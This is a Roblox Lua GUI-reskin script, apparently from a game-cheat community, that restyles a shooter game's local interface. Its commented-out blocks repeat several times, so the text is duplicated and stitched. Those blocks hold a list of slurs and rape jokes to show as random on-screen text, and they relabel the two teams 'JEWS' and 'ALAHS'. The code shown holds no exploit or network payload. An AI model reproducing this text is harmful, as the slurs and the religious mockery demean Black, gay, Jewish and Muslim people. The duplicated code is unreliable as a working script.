	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

